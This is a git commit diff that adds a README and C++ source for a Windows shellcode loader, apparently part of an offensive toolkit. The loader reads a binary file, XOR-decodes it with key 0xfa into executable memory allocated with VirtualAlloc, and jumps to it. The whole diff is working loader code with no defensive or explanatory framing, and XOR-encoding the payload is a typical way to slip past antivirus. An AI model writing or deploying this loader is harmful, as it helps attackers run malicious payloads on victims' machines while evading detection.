d54e4577a7b6b46a0feab37c6d0b9eeeaa923f2f
Mane <mane@manesec.com>
2024-06-19 05:56:10 +0800

    update

---
+++ loader-FromBinary-Xor-C/README.md
@@ -0,0 +1,9 @@
+# Load From Binary With C
+
+Loading shell code from binary, Using C Programming Language.
+
+Usage: `loadFromBinaryWithC.exe <mane.bin>`
+
+## Technical
+
+Copy shellcode from binary to memory, and jump to shellcode.
---
+++ loader-FromBinary-Xor-C/loadbin1/Source.cpp
@@ -0,0 +1,79 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+typedef void (*fp) (void);
+
+int getFileSize(FILE* filePointer)
+{
+	fseek(filePointer, 0L, SEEK_END);
+	int size = ftell(filePointer);
+	fseek(filePointer, 0L, SEEK_SET);
+	return size;
+}
+
+int main(int argc, char const* argv[])
+{ 
+	printf("===========================================================================================================\n");
+	printf(" #####                               #####                       #                                         \n");
+	printf("#     # #    # ###### #      #      #     #  ####  #####  ###### #        ####    ##   #####  ###### ##### \n");
+	printf("#       #    # #      #      #      #       #    # #    # #      #       #    #  #  #  #    # #      #    #\n");
+	printf(" #####  ###### #####  #      #      #       #    # #    # #####  #       #    # #    # #    # #####  #    #\n");
+	printf("      # #    # #      #      #      #       #    # #    # #      #       #    # ###### #    # #      ##### \n");
+	printf("#     # #    # #      #      #      #     # #    # #    # #      #       #    # #    # #    # #      #   # \n");
+	printf(" #####  #    # ###### ###### ######  #####   ####  #####  ###### #######  ####  #    # #####  ###### #    #\n");
+	printf("-----------------------------------------------------------------------------------------------------------\n");
+	printf("               ##   https://github.com/manesec/shellcodeloader4mane   x  @manesec   ##\n");
+	printf("===========================================================================================================\n\n");
+
+	if (argc == 2)
+	{
+		FILE* shellcode;
+		errno_t err;
+
+		err = fopen_s(&shellcode, argv[1], "rb");
+		if (err == 0 && shellcode != NULL)
+		{
+			int len = getFileSize(shellcode);
+			printf("[Info] Reading Shellcode length: %d\n", len);
+			char* buffer = NULL;
+			buffer = (char*)VirtualAlloc(NULL, len + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+			if (buffer != NULL)
+			{
+				fread(buffer, len + 1, 1, shellcode);
+				fclose(shellcode);
+
+				for (int i = 0; i < len + 1; i++)
+	      	    {
+					buffer[i] = (byte)((UINT)buffer[i] ^ 0xfa);
+				}
+
+				printf("[INFO] Running Shellcode XORed ..");
+
+				fp loaded_shell = (fp)buffer;
+				loaded_shell();
+
+
+				printf("[INFO] Shell Loading Done.");
+				VirtualFree(buffer, 0, MEM_RELEASE);
+				return 0;
+			}
+			else
+			{
+				printf("[ERROR] Could not allocate memory for buffer.");
+				return 1;
+			}
+		}
+		else
+		{
+			perror("[ERROR] Can't load the shellcode.");
+			return 1;
+		}
+
+	}
+	else
+	{
+		printf("loadFromBinaryWithC.exe <mane.bin>");
+		return 1;
+	}
+}
